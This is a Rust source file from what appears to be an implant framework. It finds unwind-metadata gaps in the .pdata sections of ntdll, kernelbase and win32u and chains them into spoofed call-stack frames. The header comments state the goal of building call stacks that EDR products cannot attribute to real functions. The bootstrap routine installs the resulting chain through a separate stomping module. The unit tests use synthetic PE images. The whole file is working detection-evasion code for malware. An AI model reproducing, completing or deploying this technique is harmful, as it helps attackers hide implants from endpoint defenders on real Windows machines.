//! LACUNA ghost-frame call-stack spoofing — cross-version .pdata gap scanner.
//!
//! ## How it works
//! Windows .pdata contains RUNTIME_FUNCTION entries. Gaps BETWEEN entries
//! have NO unwind metadata. When RtlVirtualUnwind hits a return address in
//! a gap, RtlLookupFunctionEntry → NULL → unwinder treats as leaf frame →
//! advances RSP by 8. We exploit this to build fake but structurally valid
//! call stacks that EDRs cannot map to any real function.
//!
//! ## Cross-version compatibility
//! The .pdata format is stable across all x64 Windows PE since XP x64.
//! Gaps vary per build, but the SCANNING ALGORITHM is identical. Runtime
//! scanning at bootstrap = zero hardcoded offsets.

#![cfg(target_os = "windows")]

use nyx_implant_core::heap::Vec;

#[derive(Clone, Copy)]
pub struct GhostRegion {
    pub rva_begin: u32,
    pub rva_end: u32,
    pub va_begin: usize,
    pub len: usize,
}

pub struct GhostFrame {
    pub va: usize,
}

pub struct GhostChain {
    pub frames: Vec<usize>,
}

/// Scan .pdata lacunae in a loaded x64 PE module. Cross-version — the
/// IMAGE_RUNTIME_FUNCTION_ENTRY layout (12 bytes, sorted by BeginAddress)
/// is stable since Windows XP x64.
///
/// # Safety
/// `module_base` must point at a valid mapped x64 PE image with readable
/// headers and `.pdata`.
pub unsafe fn scan_ghosts(module_base: *const u8) -> Vec<GhostRegion> {
    let mut ghosts = Vec::new();

    let (rtf_rva, rtf_size) = match locate_pdata(module_base) {
        Some(p) => p,
        None => return ghosts,
    };
    if rtf_size % 12 != 0 {
        return ghosts;
    }

    let count = rtf_size / 12;
    let rtf_base = unsafe { module_base.add(rtf_rva) };
    let mut prev_end: u32 = 0;

    for i in 0..count {
        let begin = unsafe { *(rtf_base.add(i * 12) as *const u32) };
        let end = unsafe { *(rtf_base.add(i * 12 + 4) as *const u32) };

        if prev_end > 0 && begin > prev_end {
            let len = (begin - prev_end) as usize;
            if len >= 16 {
                ghosts.push(GhostRegion {
                    rva_begin: prev_end,
                    rva_end: begin,
                    va_begin: module_base as usize + prev_end as usize,
                    len,
                });
            }
        }
        if end > prev_end {
            prev_end = end;
        }
    }

    ghosts
}

/// Locate .pdata: try DataDirectory[3] first, then scan section names.
fn locate_pdata(base: *const u8) -> Option<(usize, usize)> {
    let e_lfanew = unsafe { *(base.add(0x3C) as *const i32) } as usize;
    let nt = unsafe { base.add(e_lfanew) };
    let magic = unsafe { *(nt.add(4 + 20) as *const u16) };
    let dd_off: usize = if magic == 0x20B { 112 } else { 96 };

    // Try Exception Directory (IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3).
    let exc_rva = unsafe { *(nt.add(4 + dd_off + 3 * 8) as *const u32) } as usize;
    let exc_sz = unsafe { *(nt.add(4 + dd_off + 3 * 8 + 4) as *const u32) } as usize;
    if exc_rva != 0 && exc_sz >= 12 {
        return Some((exc_rva, exc_sz));
    }

    // Fallback: scan section headers for ".pdata".
    let num_sec = unsafe { *(nt.add(4 + 2) as *const u16) } as usize;
    let opt_sz = unsafe { *(nt.add(4 + 16) as *const u16) } as usize;
    let sec_base = unsafe { nt.add(4 + 20 + opt_sz) };
    for i in 0..num_sec {
        let sec = unsafe { sec_base.add(i * 40) };
        let name = unsafe { core::slice::from_raw_parts(sec, 8) };
        if name.len() >= 6 && &name[..6] == b".pdata" {
            let rva = unsafe { *(sec.add(12) as *const u32) } as usize;
            let vs = unsafe { *(sec.add(8) as *const u32) } as usize;
            let rs = unsafe { *(sec.add(16) as *const u32) } as usize;
            return Some((rva, vs.max(rs)));
        }
    }
    None
}

/// Build a ghost frame chain from lacunae in multiple modules.
pub fn build_ghost_chain(
    ntdll: &[GhostRegion],
    kernelbase: &[GhostRegion],
    win32u: &[GhostRegion],
    depth: usize,
) -> GhostChain {
    let mut frames = Vec::with_capacity(depth);
    let pools: [&[GhostRegion]; 3] = [ntdll, kernelbase, win32u];
    for i in 0..depth {
        let pool = pools[i % 3];
        if let Some(r) = pool.get((i / 3) % pool.len().max(1)) {
            frames.push(r.va_begin + r.len / 2);
        }
    }
    GhostChain { frames }
}

// ---- Bootstrap integration ----

use core::sync::atomic::{AtomicBool, Ordering};

/// One-shot bootstrap scan of the always-loaded subsystem DLLs' `.pdata`
/// lacunae (ntdll / kernelbase / win32u). No-op after the first call.
///
/// # Safety
/// Parses the PE headers of loaded modules via [`scan_ghosts`]; read-only,
/// but must run in a live process with those DLLs mapped.
pub unsafe fn bootstrap_scan() {
    static SCANNED: AtomicBool = AtomicBool::new(false);

    if SCANNED.load(Ordering::Acquire) {
        return;
    }

    let mut ntdll_ghosts = Vec::new();
    let mut kb_ghosts = Vec::new();
    let mut w32_ghosts = Vec::new();

    if let Some(base) = unsafe { nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") } {
        ntdll_ghosts = scan_ghosts(base);
    }
    if let Some(base) = unsafe { nyx_implant_core::resolve::module_base_by_name(b"kernelbase.dll") }
    {
        kb_ghosts = scan_ghosts(base);
    }
    if let Some(base) = unsafe { nyx_implant_core::resolve::module_base_by_name(b"win32u.dll") } {
        w32_ghosts = scan_ghosts(base);
    }

    if !ntdll_ghosts.is_empty() {
        let chain = build_ghost_chain(&ntdll_ghosts, &kb_ghosts, &w32_ghosts, 6);
        crate::lacuna_stomp::install_ghost_chain(&chain);
    }

    SCANNED.store(true, Ordering::Release);
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Synthetic PE with a .pdata exception directory holding the given
    /// RUNTIME_FUNCTION entries (begin, end). PE32+ magic so the directory
    /// path (not the section-name fallback) is exercised.
    fn fake_pe_with_pdata_dir(entries: &[(u32, u32)]) -> std::vec::Vec<u8> {
        const E_LFANEW: usize = 0x80;
        const PDATA_RVA: usize = 0x2000;
        let mut buf = std::vec![0u8; PDATA_RVA + entries.len() * 12 + 16];
        buf[0x3C..0x40].copy_from_slice(&(E_LFANEW as i32).to_le_bytes());
        let nt = E_LFANEW;
        buf[nt] = b'P';
        buf[nt + 1] = b'E';
        // OptionalHeader magic PE32+ (0x20B) at nt+4+20.
        buf[nt + 24..nt + 26].copy_from_slice(&0x20Bu16.to_le_bytes());
        // DataDirectory[3] (Exception): RVA at nt+4+112+3*8, size +4.
        let dd = nt + 4 + 112 + 3 * 8;
        buf[dd..dd + 4].copy_from_slice(&(PDATA_RVA as u32).to_le_bytes());
        buf[dd + 4..dd + 8].copy_from_slice(&((entries.len() * 12) as u32).to_le_bytes());
        for (i, &(begin, end)) in entries.iter().enumerate() {
            let e = PDATA_RVA + i * 12;
            buf[e..e + 4].copy_from_slice(&begin.to_le_bytes());
            buf[e + 4..e + 8].copy_from_slice(&end.to_le_bytes());
        }
        buf
    }

    /// A ≥16-byte gap between two RUNTIME_FUNCTION entries yields one
    /// GhostRegion with exact RVA/VA/len.
    #[test]
    fn scan_ghosts_finds_inter_function_gap() {
        let pe = fake_pe_with_pdata_dir(&[(0x1000, 0x1100), (0x1200, 0x1300)]);
        let ghosts = unsafe { scan_ghosts(pe.as_ptr()) };
        assert_eq!(ghosts.len(), 1);
        let g = ghosts[0];
        assert_eq!(g.rva_begin, 0x1100);
        assert_eq!(g.rva_end, 0x1200);
        assert_eq!(g.va_begin, pe.as_ptr() as usize + 0x1100);
        assert_eq!(g.len, 0x100);
    }

    /// Gaps smaller than 16 bytes are rejected.
    #[test]
    fn scan_ghosts_rejects_sub_16_gaps() {
        let pe = fake_pe_with_pdata_dir(&[(0x1000, 0x1100), (0x1108, 0x1200)]);
        assert!(unsafe { scan_ghosts(pe.as_ptr()) }.is_empty());
    }

    /// The chain builder rotates ntdll → kernelbase → win32u and anchors each
    /// frame at the region MIDPOINT (va_begin + len/2).
    #[test]
    fn build_ghost_chain_rotates_pools_at_midpoints() {
        let mk = |va: usize, len: usize| GhostRegion {
            rva_begin: 0,
            rva_end: 0,
            va_begin: va,
            len,
        };
        let ntdll = [mk(1000, 100)];
        let kb = [mk(2000, 200)];
        let w32u = [mk(3000, 300)];
        let chain = build_ghost_chain(&ntdll, &kb, &w32u, 6);
        let want = [1050usize, 2100, 3150, 1050, 2100, 3150];
        assert_eq!(chain.frames.as_slice(), &want);
    }

    /// Empty pools contribute no frames; a partially-populated pool set keeps
    /// cycling its own entries.
    #[test]
    fn build_ghost_chain_skips_empty_pools() {
        let mk = |va: usize| GhostRegion {
            rva_begin: 0,
            rva_end: 0,
            va_begin: va,
            len: 64,
        };
        let empty: [GhostRegion; 0] = [];
        let chain = build_ghost_chain(&empty, &empty, &empty, 3);
        assert!(chain.frames.is_empty());
        let ntdll = [mk(1000), mk(5000)];
        let chain = build_ghost_chain(&ntdll, &empty, &empty, 4);
        assert_eq!(chain.frames.as_slice(), &[1032usize, 5032]);
    }
}
